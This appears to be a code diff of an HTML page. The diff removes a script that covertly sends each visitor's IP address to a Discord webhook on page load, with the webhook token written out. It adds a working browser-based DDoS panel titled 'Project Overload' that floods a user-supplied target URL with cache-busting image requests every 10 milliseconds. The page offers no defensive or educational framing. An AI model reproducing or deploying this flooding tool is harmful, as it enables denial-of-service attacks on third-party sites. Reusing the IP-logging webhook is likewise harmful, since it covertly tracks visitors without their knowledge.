@@ -1,36 +1,192 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>52</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Network Stress Test Center</title>
+    <style>
+        body {
+            background-color: #0a0a0a;
+            color: #00ff41;
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column;
+        }
+        .container {
+            background-color: #1a1a1a;
+            border: 1px solid #00ff41;
+            padding: 25px;
+            width: 90%;
+            max-width: 800px;
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.3);
+        }
+        h1 {
+            text-align: center;
+            text-shadow: 0 0 5px #00ff41;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+        }
+        input, select {
+            width: 100%;
+            background-color: #111;
+            border: 1px solid #00ff41;
+            color: #00ff41;
+            padding: 8px;
+            box-sizing: border-box;
+        }
+        button {
+            width: 49%;
+            padding: 10px;
+            border: none;
+            cursor: pointer;
+            font-family: 'Courier New', Courier, monospace;
+            font-weight: bold;
+        }
+        #launchBtn {
+            background-color: #ff0000;
+            color: #fff;
+        }
+        #launchBtn:disabled {
+            background-color: #550000;
+            cursor: not-allowed;
+        }
+        #stopBtn {
+            background-color: #007bff;
+            color: #fff;
+        }
+        #stopBtn:disabled {
+            background-color: #002a55;
+            cursor: not-allowed;
+        }
+        .button-group {
+            display: flex;
+            justify-content: space-between;
+        }
+        #log {
+            width: 100%;
+            height: 200px;
+            background-color: #000;
+            border: 1px solid #00ff41;
+            color: #00ff41;
+            padding: 10px;
+            box-sizing: border-box;
+            margin-top: 20px;
+            overflow-y: scroll;
+            font-size: 12px;
+            white-space: pre-wrap;
+        }
+        .status {
+            text-align: center;
+            margin-top: 10px;
+            font-size: 1.2em;
+            color: #ff4500;
+        }
+    </style>
 </head>
 <body>
-    <h1>Gopnik</h1>
-    <p>228</p>
+    <div class="container">
+        <h1>Project Overload - DDoS Panel</h1>
+        
+        <div class="form-group">
+            <label for="target">Target URL:</label>
+            <input type="text" id="target" placeholder="https://example.com">
+        </div>
+
+        <div class="form-group">
+            <label for="threads">Threads (Concurrent Requests):</label>
+            <input type="number" id="threads" value="100" min="1" max="1000">
+        </div>
+
+        <div class="button-group">
+            <button id="launchBtn">LAUNCH ATTACK</button>
+            <button id="stopBtn" disabled>STOP ATTACK</button>
+        </div>
+
+        <div class="status" id="status">Status: IDLE</div>
+
+        <textarea id="log" readonly></textarea>
+    </div>
 
     <script>
-    async function getUserIP() {
-        const response = await fetch("https://api.ipify.org?format=json");
-        const data = await response.json();
-        return data.ip;
-    }
+        const targetInput = document.getElementById('target');
+        const threadsInput = document.getElementById('threads');
+        const launchBtn = document.getElementById('launchBtn');
+        const stopBtn = document.getElementById('stopBtn');
+        const logArea = document.getElementById('log');
+        const statusDiv = document.getElementById('status');
+        
+        let attackInterval = null;
+        let isAttacking = false;
 
-    if (!sessionStorage.getItem("webhook_sent")) {
-        getUserIP().then(ipuser => {
-            fetch("https://discord.com/api/webhooks/1478222834093527060/Cv-YqSMJY_Hkpwqd5iKdAuKro_XylIjIl2BLties4ZHgx5NnFS3MIOj3ku8BSu1SYyfL", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                    content: ipuser
-                })
-            })
-            .then(r => console.log("Webhook sent"))
-            .catch(err => console.error("Webhook error:", err));
+        function log(message) {
+            const timestamp = new Date().toLocaleTimeString();
+            logArea.value += `[${timestamp}] ${message}\n`;
+            logArea.scrollTop = logArea.scrollHeight; // Auto-scroll
+        }
 
-            sessionStorage.setItem("webhook_sent", "true");
-        });
-    }
+        function startAttack() {
+            const target = targetInput.value;
+            const threads = parseInt(threadsInput.value, 10);
+
+            if (!target) {
+                log("ERROR: Target URL is required.");
+                return;
+            }
+
+            if (isAttacking) {
+                log("INFO: Attack already in progress.");
+                return;
+            }
+
+            isAttacking = true;
+            launchBtn.disabled = true;
+            stopBtn.disabled = false;
+            targetInput.disabled = true;
+            threadsInput.disabled = true;
+            statusDiv.textContent = 'Status: ATTACKING';
+            statusDiv.style.color = '#ff0000';
+            log(`ATTACK INITIATED on ${target} with ${threads} threads.`);
+
+            attackInterval = setInterval(() => {
+                for (let i = 0; i < threads; i++) {
+                    // This creates an image in memory and sets its source to the target.
+                    // The browser sends an HTTP GET request to fetch this "image".
+                    // Adding a random query parameter prevents caching.
+                    let img = new Image();
+                    img.src = target + '?' + Math.random();
+                    log(`Packet sent to ${target}`);
+                }
+            }, 10); // Fire a batch of requests every 10ms
+        }
+
+        function stopAttack() {
+            if (!isAttacking) {
+                return;
+            }
+
+            clearInterval(attackInterval);
+            isAttacking = false;
+            launchBtn.disabled = false;
+            stopBtn.disabled = true;
+            targetInput.disabled = false;
+            threadsInput.disabled = false;
+            statusDiv.textContent = 'Status: IDLE';
+            statusDiv.style.color = '#ff4500';
+            log("ATTACK TERMINATED.");
+        }
+
+        launchBtn.addEventListener('click', startAttack);
+        stopBtn.addEventListener('click', stopAttack);
     </script>
 </body>
 </html>
